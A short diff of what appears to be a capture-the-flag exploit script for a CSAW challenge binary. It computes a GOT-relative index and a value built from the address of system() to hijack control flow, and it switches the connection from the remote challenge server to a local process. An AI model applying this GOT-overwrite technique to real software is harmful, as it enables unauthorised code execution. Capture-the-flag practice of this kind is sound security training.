@@ -14,8 +14,8 @@ value1 = string*2 - exit_msg_val
 index2 = (GOT - bets) // 8
 value2 = system_addr * 2 - GOT_val
  
-#r = pwn.process("./double_zer0_dilemma")
-r = pwn.process("nc double-zer0.csaw.io 9999", shell=True)
+r = pwn.process("./double_zer0_dilemma")
+#r = pwn.process("nc double-zer0.csaw.io 9999", shell=True)
 
 print("index1: " + str(index1))
 print("value1: " + str(value1))
